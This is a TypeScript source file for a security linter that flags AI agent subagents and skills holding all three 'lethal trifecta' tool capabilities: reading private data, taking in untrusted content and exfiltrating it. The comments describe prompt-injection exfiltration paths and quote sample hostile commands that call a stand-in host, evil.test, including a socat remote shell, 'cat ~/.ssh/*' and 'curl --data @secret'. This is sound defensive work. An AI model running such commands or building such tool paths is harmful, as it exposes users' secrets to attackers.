/**
 * The LETHAL-TRIFECTA check — the headline Safety detector. Simon Willison's
 * "lethal trifecta": a single unit (a subagent / model-invocable skill) that
 * simultaneously holds all THREE capability legs is a prompt-injection
 * exfiltration path with NO exploit code — attacker-controllable content flows
 * in, reads your private data, and ships it out, all driven by the model.
 *
 *   LEG A — PRIVATE-DATA READ   — can read local secrets / files / repo
 *                                 (Read, mcp__filesystem__*, github get_file,
 *                                  and `Bash`, which can `cat ~/.ssh/*` / `.env`).
 *   LEG B — UNTRUSTED-CONTENT INTAKE — ingests attacker-controllable content
 *                                 (WebFetch, WebSearch, mcp__fetch__*, MCP
 *                                  servers reading issues / email / tickets).
 *   LEG C — EXFILTRATION CHANNEL — can send data out (WebFetch, computer_use,
 *                                  github create_pull_request / add_issue_comment,
 *                                  any external-write MCP, and `Bash`, which can
 *                                  `curl`/`wget` to anywhere).
 *
 * Meta's "Rule of Two": allow at most two of the three legs in one unit. A unit
 * holding all three is the hard finding. NO other tool checks the tool-SET for
 * this — every competitor lints a single tool's effect, never the dangerous
 * COMBINATION.
 *
 * `Bash` is special: it satisfies BOTH leg A (read a secret) AND leg C (curl it
 * out). So `Bash` + any leg-B tool (e.g. `WebFetch`) is already all three legs.
 *
 * HIGH-PRECISION (don't-cry-wolf): only WELL-KNOWN tools map to a leg; an
 * unknown tool maps to nothing. A `Tool(restriction)` suffix is stripped with the
 * same `baseTool` shape `effects.ts` uses.
 *
 * INHERITS-ALL: a unit with no `tools:` line inherits ALL tools — maximal blast
 * radius, trivially all three legs. Aligned with the codebase's existing
 * "inherits-all is ADVISORY" stance (compile/scan treat a missing contract as a
 * footgun note, not a hard defect), an inherits-all trifecta is reported as
 * `"advisory"`; an EXPLICIT all-three contract is the `"hard"` flag.
 *
 * 🔴 SUBAGENTS ONLY. Everything above is the SUBAGENT reading, where `tools:` is a
 * documented rail that really does bound the unit. It is NOT how a SKILL works —
 * a skill's `allowed-tools:` is a PRE-APPROVAL, not a fence. See
 * {@link skillTrifectaIssue} for the skill path and the measurement behind it.
 *
 * Pure + ONE detector (one-detector-no-drift) — intended to be reused by `scan`
 * (the read-only audit) and a future `lethal-trifecta` lint rule. The dialect is
 * injected (core ⊄ adapter) so it generalizes across harnesses (Codex's `shell`
 * plays Bash's dual A+C role — see `LEG_BASH_DUAL` below). The per-leg catalogs
 * are LOCAL consts here because the `HarnessDialect` interface has no trifecta-leg
 * fields today; see the "Recommended dialect additions" note at the bottom.
 */
import type { HarnessDialect } from "./dialect.js";

/** The three capability legs of the lethal trifecta. */
export type TrifectaLeg = "private" | "untrusted" | "exfil";

/** The tools classified into each leg (base names, de-duplicated). */
export interface TrifectaLegs {
  /** LEG A — tools that can read private data (secrets, files, repo). */
  readonly private: readonly string[];
  /** LEG B — tools that ingest untrusted / attacker-controllable content. */
  readonly untrusted: readonly string[];
  /** LEG C — tools that can exfiltrate data out of the trust boundary. */
  readonly exfil: readonly string[];
}

/**
 * The severity of a trifecta finding:
 * - `"hard"`:     an EXPLICIT contract that names all three legs — a concrete,
 *                 declared exfil path. The flag.
 * - `"advisory"`: an inherits-all unit (no `tools:` line) that holds all three
 *                 legs only because it inherits everything — maximal blast radius,
 *                 reported as advisory in line with the inherits-all stance.
 */
export type TrifectaSeverity = "hard" | "advisory";

/**
 * How much of a fence a SKILL's `disallowed-tools:` actually is — set only on
 * findings produced by {@link skillTrifectaIssue}, absent on subagent findings.
 *
 * - `"none"` — no `disallowed-tools:` line (or an unreadable block, which yields
 *   the same thing): the skill inherits every tool the session grants. This is
 *   the DEFAULT state of every skill in the ecosystem, which is why the report
 *   aggregates it into one line instead of repeating it per skill.
 * - `"ineffective"` — a `disallowed-tools:` line exists but does not deny every
 *   built-in supplier of any one leg, so no leg is closed. That one is per-skill:
 *   an author who believed they had fenced and had not.
 */
export type SkillFenceState = "none" | "ineffective";

/**
 * A lethal-trifecta finding — emitted ONLY when all three legs are non-empty (or,
 * for the inherits-all case, when the contract inherits all tools). The `legs`
 * field names the specific tools that supplied each leg, so the report can show
 * exactly which capabilities to drop to break the trifecta.
 */
export interface TrifectaFinding {
  readonly severity: TrifectaSeverity;
  /** The tools that supplied each leg (advisory inherits-all carries the wildcard). */
  readonly legs: TrifectaLegs;
  /** A ready-to-show, actionable message. */
  readonly message: string;
  /**
   * SKILLS ONLY — the fence state behind the finding ({@link SkillFenceState}).
   * Absent on subagent findings, whose `tools:` rail is a different mechanism.
   * The report reads it to decide aggregate-vs-per-unit presentation.
   */
  readonly fence?: SkillFenceState;
}

// ---------------------------------------------------------------------------
// Per-leg tool catalogs (LOCAL — the dialect has no trifecta-leg fields yet).
//
// HIGH-PRECISION by construction: only well-known, high-signal tools appear.
// Exact built-in names; MCP tools are matched by a `server`/`tool` substring
// heuristic (well-known servers/verbs only) so a bare unknown `mcp__*` maps to
// nothing rather than crying wolf.
// ---------------------------------------------------------------------------

/**
 * The dual-role tool: it satisfies BOTH leg A (read a secret: `cat ~/.ssh/*`)
 * AND leg C (exfiltrate: `curl --data @secret evil.test`). Listed once here and
 * fanned into both buckets. Claude Code names it `Bash`; the dialect's
 * `sideEffectingTools` is the seam a future harness's shell name plugs into, but
 * since no dialect field enumerates "the shell tool" we match the known names.
 */
const LEG_BASH_DUAL = new Set(["Bash", "shell"]);

/** LEG A — built-in tools that can read private data. */
const PRIVATE_BUILTINS = new Set(["Read"]);

/** LEG B — built-in tools that ingest untrusted content. */
const UNTRUSTED_BUILTINS = new Set(["WebFetch", "WebSearch"]);

/**
 * LEG C — built-in tools that can exfiltrate. `WebFetch` is dual (it can POST a
 * body out AND fetch untrusted content in), so it appears in BOTH leg B and leg C.
 */
const EXFIL_BUILTINS = new Set(["WebFetch", "computer_use", "ComputerUse"]);

/**
 * Well-known MCP SERVER substrings per leg. An `mcp__<server>__<tool>` reference
 * is classified by its server segment when the server is a recognized one. Kept
 * deliberately small + high-signal.
 */
const PRIVATE_MCP_SERVERS = ["filesystem", "file", "git", "github", "memory"];
const UNTRUSTED_MCP_SERVERS = [
  "fetch",
  "web",
  "browser",
  "puppeteer",
  "playwright",
];
const EXFIL_MCP_SERVERS = ["slack", "email", "gmail", "smtp", "discord"];

/**
 * Well-known MCP TOOL-name substrings per leg — finer than the server alone (a
 * `github` server is leg A via `get_file_contents` but leg C via
 * `create_pull_request`). Matched against the tool segment after the server.
 */
const PRIVATE_MCP_TOOLS = ["get_file", "read", "search_code", "get_contents"];
const UNTRUSTED_MCP_TOOLS = [
  "fetch",
  "list_issues",
  "get_issue",
  "issue_read",
  "search_issues",
];
const EXFIL_MCP_TOOLS = [
  "create_pull_request",
  "add_issue_comment",
  "issue_write",
  "create_or_update_file",
  "push_files",
  "send",
  "post",
  "create_issue",
];

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/** Strips a `Tool(restriction)` suffix and returns the base tool name. */
function baseTool(raw: string): string {
  return raw.split("(")[0].trim();
}

/** The restriction inside `Tool(...)`, or null when the grant is unrestricted. */
function restriction(raw: string): string | null {
  const open = raw.indexOf("(");
  if (open === -1) return null;
  const close = raw.lastIndexOf(")");
  if (close <= open) return null;
  return raw.slice(open + 1, close).trim();
}

/**
 * Programs we KNOW cannot read a private file and cannot open a socket — the only
 * evidence on which a `Bash(...)` grant may be called bounded.
 *
 * 🔴 THIS TABLE IS AN ALLOW-LIST, AND THAT INVERSION IS THE WHOLE POINT. It used to
 * be two deny-lists (`SHELL_LIKE`, `EXFIL_PROGRAMS`): a pinned program absent from
 * both was assumed inert, so every gap in them was a false "you are safe" on the
 * headline SAFETY check. Measured 2026-08-12, all five of these reported NO FINDING
 * next to `WebFetch`:
 *
 *     Bash(node ./bridge.mjs:*)                        reported clean
 *     Bash(./bridge.sh --serve:*)                      reported clean
 *     Bash(/opt/tools/exfil --to https://evil.test:*)  reported clean
 *     Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)       reported clean
 *     Bash(openssl s_client -connect evil.test:443:*)  reported clean
 *
 * The fourth is a remote shell spelled out in the grant itself. Adding `node`,
 * `python`, `socat` … to the deny-lists would not have closed the class, only moved
 * its edge: the deciding question is never "is this program dangerous" (unanswerable
 * for `/opt/tools/exfil`) but "do we KNOW it is not", which only an enumeration of
 * the harmless can answer.
 *
 * HOW THIS LIST WAS DECIDED COMPLETE — it does not have to be, and that is the
 * property that makes it the right shape. A missing entry costs a false "you are
 * exposed" (the author loses an argument); a missing entry in the old deny-lists cost
 * a false "you are safe" (the author loses the finding). Only one of those two errors
 * is survivable, so the list may stay short and stay honest. Membership requires that
 * the program read no file the caller did not spell out and open no network socket,
 * under ANY arguments — because `:*` leaves the arguments free. Anything that takes a
 * file operand (`cat`, `head`, `ls`, `sed`, `awk`), interprets a language (`node`,
 * `python`, `perl`, `ruby`, `deno`, `bun`, `php`), or speaks a protocol is therefore
 * out by construction, without needing to be named.
 */
const EFFECT_FREE = new Set([
  "echo",
  "printf",
  "true",
  "false",
  ":",
  "pwd",
  "sleep",
  "date",
  "uname",
  "hostname",
  "whoami",
  "id",
  "basename",
  "dirname",
]);

/**
 * Does a `Bash(...)` grant still supply the shell's legs — reading a secret and
 * curling it out — or has it been narrowed to a command that cannot?
 *
 * Narrowing the grant is a remedy this tool RECOMMENDS, so the reading has to be able
 * to see a narrowed grant as narrowed: `Bash(node ./scripts/log.mjs:*)` was once read
 * as plain `Bash` — the whole shell, in both leg A and leg C — and an author who took
 * the advice saw the score not move. But the fix for that overshot into the opposite
 * error, and the opposite error is the one that matters (see {@link EFFECT_FREE}), so
 * the answer is now: a grant is bounded ONLY when it pins a program from that list.
 *
 * The honest consequence, stated rather than hidden: narrowing `Bash` to a script of
 * your own (`node ./ledger.mjs`) no longer drops a leg, because nothing here has read
 * that script. The remedy that still works is to drop a leg the checker can SEE — fence
 * the tool off, or narrow to a command whose effects are enumerable.
 *
 *   Bash            no restriction at all
 *   Bash(*)         Bash(:*)        the wildcard forms
 *   Bash(node:*)    Bash(node x.mjs:*)   an interpreter runs whatever it is handed
 *   Bash(sh ...)    Bash(curl ...)  the shell, and the pinned exfiltrator
 *   Bash(echo ready:*)                   bounded — and only this shape is
 *
 * When in doubt it returns true (keeps the legs): a false "you are exposed" costs the
 * author an argument, a false "you are safe" costs them the finding.
 */
export function bashGrantIsUnbounded(raw: string): boolean {
  const r = restriction(raw);
  if (r === null) return true; // bare `Bash`
  const pattern = r.replace(/^["']|["']$/g, "").trim();
  if (pattern === "" || pattern === "*" || pattern === ":*") return true;

  // `Bash(echo hi:*)` — the trailing `:*` is Claude Code's prefix marker, not part of
  // the program name. Strip it before reading the head word.
  const head = pattern.replace(/:\*$/, "").trim().split(/\s+/)[0] ?? "";
  const program = (head.split("/").pop() ?? head).toLowerCase();
  return !EFFECT_FREE.has(program);
}

/** Returns true for the wildcard sentinels that mean "inherits-all". */
function isWildcard(tool: string): boolean {
  return tool === "" || tool === "*";
}

/**
 * Split an MCP grant into `{ server, tool }`, or null. Handles three forms:
 * - a concrete `mcp__<server>__<tool>` (tool = the named tool);
 * - a SERVER-WIDE grant `mcp__<server>` or `mcp__<server>__*` / `__.*` (tool = ""
 *   → classify by the SERVER alone, since it grants every tool on that server).
 * Without the server-wide case a contract like `mcp__slack__*` would grant an
 * exfil-capable server yet contribute no leg (reported clean when it isn't).
 */
function mcpParts(
  base: string,
  dialect: HarnessDialect,
): { server: string; tool: string } | null {
  if (dialect.mcpToolPattern.test(base)) {
    const m = /^mcp__([^_]+(?:_[^_]+)*?)__(.+)$/.exec(base);
    if (m) return { server: m[1].toLowerCase(), tool: m[2].toLowerCase() };
  }
  // Server-wide: `mcp__server`, `mcp__server__*`, `mcp__server__.*`.
  const sw = /^mcp__([a-z0-9-]+(?:_[a-z0-9-]+)*?)(?:__(?:\*|\.\*))?$/i.exec(
    base,
  );
  if (sw) return { server: sw[1].toLowerCase(), tool: "" };
  return null;
}

function anySubstr(haystack: string, needles: readonly string[]): boolean {
  return needles.some((n) => haystack.includes(n));
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Classify each tool in a declared contract into the trifecta legs it supplies.
 * A single tool may land in MULTIPLE legs (`Bash` → A+C, `WebFetch` → B+C). An
 * unknown tool lands in none (high-precision). De-duplicated per leg.
 *
 * NOTE on inherits-all: a wildcard (`""`/`"*"`) entry is NOT classified into a
 * named leg here (it has no concrete tool name); the inherits-all case is handled
 * by {@link lethalTrifectaIssues}, which knows it grants every leg.
 */
export function classifyTrifectaLegs(
  tools: readonly string[],
  dialect: HarnessDialect,
): TrifectaLegs {
  const priv = new Set<string>();
  const untrusted = new Set<string>();
  const exfil = new Set<string>();

  for (const raw of tools) {
    const base = baseTool(raw);
    if (isWildcard(base)) continue; // handled by the issues fn, not a named leg

    // Dual-role shell: leg A AND leg C — unless the grant has been narrowed to a
    // command that is neither a shell nor an exfiltration tool, which is the remedy
    // this checker itself recommends. See {@link bashGrantIsUnbounded}.
    if (LEG_BASH_DUAL.has(base)) {
      if (bashGrantIsUnbounded(raw)) {
        priv.add(base);
        exfil.add(base);
      }
      continue;
    }
    if (PRIVATE_BUILTINS.has(base)) priv.add(base);
    if (UNTRUSTED_BUILTINS.has(base)) untrusted.add(base);
    if (EXFIL_BUILTINS.has(base)) exfil.add(base);

    const parts = mcpParts(base, dialect);
    if (parts) {
      const { server, tool } = parts;
      if (
        anySubstr(server, PRIVATE_MCP_SERVERS) ||
        anySubstr(tool, PRIVATE_MCP_TOOLS)
      )
        priv.add(base);
      if (
        anySubstr(server, UNTRUSTED_MCP_SERVERS) ||
        anySubstr(tool, UNTRUSTED_MCP_TOOLS)
      )
        untrusted.add(base);
      if (
        anySubstr(server, EXFIL_MCP_SERVERS) ||
        anySubstr(tool, EXFIL_MCP_TOOLS)
      )
        exfil.add(base);
    }
  }

  return { private: [...priv], untrusted: [...untrusted], exfil: [...exfil] };
}

/** Extra facts about HOW the contract was obtained, which change the verdict. */
export interface TrifectaContext {
  /**
   * The unit's frontmatter block EXISTS but is not valid YAML.
   *
   * 🔴 WHY THE DETECTOR NEEDS TO KNOW. vigiles's frontmatter reader is
   * deliberately lenient: on a block js-yaml rejects it regex-SALVAGES the
   * fields, so the live PreToolUse rail still has something to enforce. Right
   * for a rail, wrong for a score. Measured 2026-08-08:
   * `readFrontmatter(bad).malformed` is `true` — the tool KNOWS the block is
   * broken — while `frontmatterList(…, "allowed-tools")` on it still returns
   * `["Read","Bash"]`, the narrow contract its author MEANT. A unit whose
   * contract a strict loader rejects was therefore graded as though it had
   * declared exactly that list, and scored CLEAN. Presence of a declaration is
   * not enforcement of it — the product's own thesis, turned on the product.
   *
   * With this set, `tools` is read as a SALVAGE, not a contract: it can only make
   * the verdict worse, never better. A salvaged list that names all three legs
   * still fires `"hard"` (both readings of the file agree the unit holds them);
   * anything less falls back to what a strict loader actually yields — no
   * contract at all, i.e. inherits-all, which is the `"advisory"` finding.
   */
  readonly contractUnreadable?: boolean;
}

// ---------------------------------------------------------------------------
// The remedy sentence — split by CAUSE, because one sentence for every unit is a
// finding nobody can act on
//
// 🔴 MEASURED. After `allowed-tools:` stopped being read as a bound, a real
// 38-skill repo went from 18 of 38 exposed units to 38 of 38 and Safety 86 → 70.
// The classification is right and stays; what broke is the READING. A check that
// fires on every unit carries no information unless it says why THIS unit fired,
// and the sentence it carried — "Drop at least one leg (Meta's Rule of Two)" —
// was identical for three situations that need three different actions:
//
//   Read, WebFetch, Bash                  nothing was attempted
//   Read, WebFetch, Bash(node ./x.mjs:*)  an attempt was made and did not count
//   Read, WebFetch                        the shell is not involved at all
//
// ⚠️ AND THE ADVICE ITSELF HAS GONE STALE. "Narrow your `Bash(...)`" used to be
// the headline remedy; a grant now counts as bounded ONLY when it pins a program
// from `EFFECT_FREE`, which is fourteen entries long and will stay that way by
// design (see its header: the list may be short precisely because a miss costs a
// false "you are exposed", never a false "you are safe"). So narrowing to
// anything an author actually runs — their own script, `node`, `jq`, `git` —
// does not drop the leg and never will. Printing the old advice sends the author
// to do work that cannot move the finding, which is how a Safety number gets a
// reputation for being fake. The middle case is the worst of the three: the
// author already did it, and the unchanged message tells them nothing.
//
// Text only. Which units are found, and how they are graded, is untouched.
// ---------------------------------------------------------------------------

/**
 * The shell grants in this contract that ASKED FOR LESS THAN THE WHOLE SHELL and
 * still supply both legs — `Bash(node ./x.mjs:*)`, not bare `Bash`.
 *
 * These are the surprising ones, and the only ones whose author has already tried
 * the remedy. A grant with no restriction at all, and one that pins an
 * {@link EFFECT_FREE} program (which supplies no leg and cannot reach here), are
 * both excluded.
 */
function opaqueShellGrants(tools: readonly string[]): string[] {
  return tools.filter(
    (raw) =>
      LEG_BASH_DUAL.has(baseTool(raw)) &&
      bashGrantIsUnbounded(raw) &&
      restriction(raw) !== null,
  );
}

/**
 * The remedy for a `"hard"` (explicit-contract) trifecta, chosen by WHY this
 * unit still holds all three legs. See the block above for the measurement.
 */
function hardTrifectaRemedy(
  tools: readonly string[],
  dialect: HarnessDialect,
): string {
  const shell = dialect.builtinAgentTools.find((t) => LEG_BASH_DUAL.has(t));
  const opaque = opaqueShellGrants(tools);

  // (b) A RESTRICTED shell grant that still counts. The author narrowed and the
  // finding did not move; say why, and do not re-recommend narrowing.
  if (opaque.length > 0) {
    return (
      `\`${opaque.join("`, `")}\` is narrowed but still counts: a restricted shell grant ` +
      "drops the read+exfiltrate legs ONLY when it pins a program whose effects are " +
      `enumerable (${[...EFFECT_FREE].slice(0, 4).join(", ")}, … — ${String(EFFECT_FREE.size)} in all). ` +
      "Nothing here has read the script or binary you pinned, and an interpreter runs " +
      "whatever it is handed, so narrowing further will not move this finding. What does: " +
      `remove ${shell ?? "the shell"} from the contract, or drop the read or the ` +
      "untrusted-intake leg instead (Meta's Rule of Two: allow at most two)."
    );
  }

  // (a) An UNRESTRICTED shell grant — the shell supplies two of the three legs on
  // its own, so it is the single highest-value tool to remove.
  //
  // 🔴 The test is "does the shell actually supply a leg", NOT "is a shell named".
  // `Bash(echo ready:*)` is named and bounded: it contributes nothing, the trifecta
  // is carried entirely by the other tools, and telling that author to remove Bash
  // would send them to undo the one narrowing that worked. Caught by running the
  // branch over a real contract rather than reasoning about it.
  const unboundedShell = tools.some(
    (t) => LEG_BASH_DUAL.has(baseTool(t)) && bashGrantIsUnbounded(t),
  );
  if (shell !== undefined && unboundedShell) {
    return (
      `${shell} alone supplies two of the three legs (it reads private files AND ships them out), ` +
      `so removing ${shell} from the contract closes the path in one edit. ` +
      "Restricting it instead — `" +
      `${shell}(<program>:*)` +
      "` — only helps for a program whose effects are enumerable " +
      `(${[...EFFECT_FREE].slice(0, 4).join(", ")}, … — ${String(EFFECT_FREE.size)} in all); ` +
      "your own script or an interpreter does not qualify. Otherwise drop the read or the " +
      "untrusted-intake leg (Meta's Rule of Two: allow at most two)."
    );
  }

  // (c) NO shell involved: the three legs are carried by named tools, so the only
  // remedy is removing one of them — there is no grant to narrow here at all.
  return (
    "No shell grant supplies a leg here, so there is nothing to narrow — the three legs " +
    "are carried by the named tools above (and any shell grant in this contract is " +
    "already bounded). Remove one of those tools; the untrusted-intake leg is usually " +
    "the cheapest to give up (Meta's Rule of Two: allow at most two)."
  );
}

/**
 * Returns a {@link TrifectaFinding} ONLY when a unit holds all three legs, else
 * `null` (≤ 2 legs = safe by the Rule of Two).
 *
 * Three paths:
 * - INHERITS-ALL (a wildcard `""`/`"*"`, or an EMPTY contract): inherits every
 *   tool → trivially all three legs → an `"advisory"` finding (the inherits-all
 *   stance: a footgun worth surfacing, not a declared exfil path).
 * - EXPLICIT: classify the named tools; emit a `"hard"` finding iff each of the
 *   three legs is non-empty.
 * - UNREADABLE ({@link TrifectaContext.contractUnreadable}): the names came from
 *   a salvage of a block a strict loader rejects. They can only make the verdict
 *   WORSE — a salvaged all-three still fires `"hard"` — and anything short of
 *   that falls back to what a strict loader really yields: no contract, i.e.
 *   inherits-all, the `"advisory"` finding. Never the other way round.
 */
export function lethalTrifectaIssues(
  tools: readonly string[],
  dialect: HarnessDialect,
  ctx: TrifectaContext = {},
): TrifectaFinding | null {
  const hasWildcard = tools.some((t) => isWildcard(baseTool(t)));
  // Inherits-all is signalled by a WILDCARD (the caller passes `["*"]` for an
  // absent `tools:` line). An EXPLICIT empty `[]` is the opposite — zero tools,
  // so it cannot hold any leg; it falls through to classify as no-trifecta. (The
  // caller must distinguish: `tools ?? ["*"]`, never `tools ?? []`.)
  if (hasWildcard) {
    const legs: TrifectaLegs = {
      private: ["*"],
      untrusted: ["*"],
      exfil: ["*"],
    };
    return {
      severity: "advisory",
      legs,
      message: ctx.contractUnreadable
        ? "Frontmatter is not valid YAML, so the declared tool list could not be read — a " +
          "strict loader rejects the block, and a regex salvage of it is a guess, not a " +
          "contract. Scored as INHERITS-ALL (every capability), which is what a strict " +
          "loader yields: it therefore holds all three lethal-trifecta legs (read private " +
          "data, ingest untrusted content, exfiltrate). Fix the YAML and the declared list " +
          "counts again — a declaration that does not parse is not an enforcement."
        : "Inherits-all contract (no explicit tools / wildcard) grants every capability — " +
          "it holds all three lethal-trifecta legs (read private data, ingest untrusted content, " +
          "exfiltrate) and is a maximal prompt-injection blast radius. Declare an explicit tools " +
          "list dropping at least one leg (Meta's Rule of Two).",
    };
  }

  const legs = classifyTrifectaLegs(tools, dialect);
  if (
    legs.private.length > 0 &&
    legs.untrusted.length > 0 &&
    legs.exfil.length > 0
  ) {
    return {
      severity: "hard",
      legs,
      message:
        "Lethal trifecta: this unit can read private data " +
        `(${legs.private.join(", ")}), ingest untrusted content ` +
        `(${legs.untrusted.join(", ")}), AND exfiltrate ` +
        `(${legs.exfil.join(", ")}) — a prompt-injection exfil path with no exploit code. ` +
        hardTrifectaRemedy(tools, dialect) +
        (ctx.contractUnreadable
          ? " (Those tool names were SALVAGED: the frontmatter is not valid YAML, so a strict" +
            " loader reads no contract here at all and the real grant may be wider still." +
            " Fix the YAML — this finding stands either way.)"
          : ""),
    };
  }
  // Fewer than three legs — but the names were salvaged from a block a strict
  // loader rejects, so "fewer" is a guess. What that loader actually yields is
  // NOTHING: no contract, which is inherits-all, which holds every leg. This is
  // the branch the defect lived in — a malformed unit scored clean because the
  // salvage happened to read narrow.
  if (ctx.contractUnreadable) {
    return lethalTrifectaIssues(["*"], dialect, ctx);
  }
  return null;
}

// ---------------------------------------------------------------------------
// SKILLS — a different mechanism, and the one this file used to read wrong
// ---------------------------------------------------------------------------
//
// 🔴 THE MEASUREMENT (2026-08-11). A skill's `allowed-tools:` is a PRE-APPROVAL,
// not a restriction. Claude Code's own docs, §"Pre-approve tools for a skill":
//
//   "The `allowed-tools` field grants permission for the listed tools during the
//    turn that invokes the skill… It does not restrict which tools are available:
//    every tool remains callable, and your permission settings still govern tools
//    that are not listed. … To remove tools from Claude's available pool while a
//    skill is active, list them in `disallowed-tools` in the skill's frontmatter."
//
// Confirmed twice from outside this repo: anthropics/claude-code#18837 (Jan 2026)
// and #37683 (Mar 2026), both closed as not-planned; #37683 reproduces it in
// INTERACTIVE mode on a live model, so it is not a headless artifact. Reproduced
// here under `claude -p` (CLI 2.1.227): a skill declaring `WebSearch, WebFetch`
// read a private file and wrote a new one.
//
// `disallowed-tools` WAS then measured, 9 runs, and it DOES restrict. The cleanest
// control is a single run in which `Read` succeeds BEFORE the skill activates and
// is denied after it:
//
//   "Permission to use Read has been denied."
//
// and, through a `Task` subagent in the same run — the route-around that defeats
// `allowed-tools` in #37683 —
//
//   "Error: No such tool available: Read. Read is disabled for this session, in
//    subagents as well as here."
//
// WHAT THAT MEANS FOR THIS CHECK. Reading `allowed-tools` as a bound made the
// finding UNDERSTATE risk (it reported 18 of 38 units exposed on a corpus where
// all 38 were) and, worse, CREDITED a narrow `allowed-tools` with a reduction it
// does not produce — the tool's own "a declaration present is not a rule enforced"
// thesis, violated by the tool. So the skill path reads `disallowed-tools` and
// ignores `allowed-tools` entirely.
//
// WHY THE SHAPE CHANGED TOO, not just the arithmetic. The naive correction — count
// every unfenced skill as a per-unit finding — fires on ~100% of every real
// harness, and a check that fires on the default state of the ecosystem gets muted
// within a day, taking the true findings with it. So the two states are presented
// differently, while being GRADED IDENTICALLY (they are the same capability; see
// `trifectaExposure`):
//
//   - `fence: "none"` — the default. One AGGREGATE line for the whole surface
//     ("N of M skills declare no tool fence") plus the skill names as detail. It
//     is one fact about the harness, not N facts about N skills, and stating it
//     once is what a reader can act on.
//   - `fence: "ineffective"` — a `disallowed-tools:` that closes no leg. Rare,
//     per-skill, and a genuine mistake (the author believed they had fenced), so
//     it keeps its own line — the same shape as `disallowed-tools-contract`'s
//     "this entry blocks nothing".
//
// Presentation differs; severity does NOT. Both are `"advisory"` and both count
// once toward `trifectaExposure`. Making the ineffective-fence case LOUDER would
// repeat the exact non-monotonicity this file was already fixed for once: an
// ineffective fence has capability ≤ no fence, so it must never grade worse.

/**
 * Built-in tools that supply each leg, for the DENY direction — a leg is closed
 * only when EVERY name here is denied.
 *
 * 🔴 This is deliberately a SUPERSET of the allow-direction catalogs above, and the
 * asymmetry is the point. In the allow direction an unlisted tool maps to no leg,
 * which UNDERSTATES risk — high precision, don't cry wolf. In the deny direction the
 * same omission would OVERSTATE safety: a leg would read as closed because we forgot
 * to require one of its suppliers. So `Grep`/`Glob` join `Read` under private-data
 * read (a grep of `.env` returns its contents), `WebSearch` joins `WebFetch` under
 * exfiltration (a query string leaves the machine), and the shell is in all three —
 * `curl` fetches attacker content in, `cat` reads the secret, `curl --data` ships it.
 *
 * STATED LIMIT, also in docs/rules/lethal-trifecta.md: this covers the harness's own
 * built-ins. An MCP server the SESSION provides can re-supply a leg the fence closed,
 * and no static read of a SKILL.md can see the session's MCP config. A closed leg
 * therefore means "closed among the built-ins", which is what the author can actually
 * control from frontmatter — not a proof of absence.
 */
const FENCE_SUPPLIERS: Record<TrifectaLeg, readonly string[]> = {
  private: ["Read", "Grep", "Glob", ...LEG_BASH_DUAL],
  untrusted: ["WebFetch", "WebSearch", ...LEG_BASH_DUAL],
  exfil: ["WebFetch", "WebSearch", ...LEG_BASH_DUAL],
};

/**
 * The suppliers of a leg that THIS harness actually ships, so the remedy names
 * tools the author can really deny. `FENCE_SUPPLIERS` carries every dialect's
 * shell name (`Bash` and Codex's `shell`); telling a Claude Code author to deny
 * `shell` would be cry-wolf, and would make the leg unclosable in practice.
 *
 * Fallback when the dialect recognizes NONE of them: keep the unfiltered list. An
 * unrecognized harness must not silently clear the check by having a catalog we
 * can't match — the safe failure is "still open", not "closed".
 */
function fenceSuppliers(
  leg: TrifectaLeg,
  dialect: HarnessDialect,
): readonly string[] {
  const catalog = new Set(dialect.builtinAgentTools);
  const known = FENCE_SUPPLIERS[leg].filter((t) => catalog.has(t));
  return known.length > 0 ? known : FENCE_SUPPLIERS[leg];
}

/** The legs a `disallowed-tools:` list leaves standing, naming the suppliers. */
export function skillFenceLegs(
  disallowed: readonly string[],
  dialect: HarnessDialect,
): TrifectaLegs {
  // Only an UNRESTRICTED deny removes a tool: `disallowed-tools: Bash(curl:*)`
  // denies that pattern and leaves the rest of the shell. Conservative by design,
  // and the mirror of `bashGrantIsUnbounded` on the allow side.
  const denied = new Set(
    disallowed
      .filter((raw) => restriction(raw) === null)
      .map((raw) => baseTool(raw)),
  );
  const remaining = (leg: TrifectaLeg): string[] =>
    fenceSuppliers(leg, dialect).filter((t) => !denied.has(t));
  return {
    private: remaining("private"),
    untrusted: remaining("untrusted"),
    exfil: remaining("exfil"),
  };
}

/** The one-line remedy, quoted in every skill finding so it is never just a diagnosis. */
function fenceFix(dialect: HarnessDialect): string {
  const list = (leg: TrifectaLeg): string =>
    fenceSuppliers(leg, dialect).join(", ");
  return (
    "Fix in one line: add a `disallowed-tools:` line naming every built-in that " +
    `supplies a leg the skill does not need — private-data read = ${list("private")}; ` +
    `untrusted intake = ${list("untrusted")}; exfiltration = ${list("exfil")}. ` +
    "Measured: `disallowed-tools` removes the tool from the pool while the skill " +
    "is active, in subagents too."
  );
}

const PREAPPROVAL_NOTE =
  "`allowed-tools:` does NOT fence a skill — it PRE-APPROVES the tools it lists " +
  '("It does not restrict which tools are available: every tool remains callable" ' +
  "— Claude Code docs), so however narrow it is, the skill still holds every leg.";

/**
 * Whether THIS harness understands a skill-level `disallowed-tools:` at all.
 *
 * Read off the dialect record that already exists — `skillFrontmatterKeys` is
 * exactly "which SKILL.md keys this harness reads", so the question "is there a
 * fence here?" is the membership of the one key that IS the fence. No new
 * capability flag: a second field saying the same thing is a second thing to
 * keep true, and the compiler already emits from this one.
 *
 * 🔴 IT USED TO ASK THE WRONG QUESTION. The body was
 * `dialect.skillFrontmatter === "claude-code"` — a harness name standing in for
 * a key, which made a harness that read `disallowed-tools:` under any other name
 * unfenceable by construction. The function already HAD its capability name;
 * only the fact it read was wrong.
 */
export function dialectSupportsSkillFence(dialect: HarnessDialect): boolean {
  return dialect.skillFrontmatterKeys.includes("disallowed-tools");
}

/**
 * The lethal-trifecta finding for a MODEL-INVOCABLE SKILL, computed from its
 * `disallowed-tools:` — the only skill frontmatter field measured to remove a
 * tool. `allowed-tools:` is not an input here, on purpose: it is a pre-approval,
 * and treating it as a bound is the defect this function exists to correct (see
 * the block comment above for the measurement).
 *
 * 🔴 AND IT IS A CLAUDE-CODE MECHANISM, which this applied to every harness. On a
 * Codex repo (`skillFrontmatterKeys: ["name", "description"]` — and our own
 * compiler drops the tool keys there) every skill was reported as holding all
 * three legs, scored against Safety, and handed the remedy "add a
 * `disallowed-tools:` line". That line is INERT in Codex: the author does the
 * work, the harness ignores the key, the finding returns, and the score never
 * moves. A remedy the target cannot apply is worse than no finding — it is a floor
 * dressed up as a defect, and it teaches people that the Safety number is fake.
 *
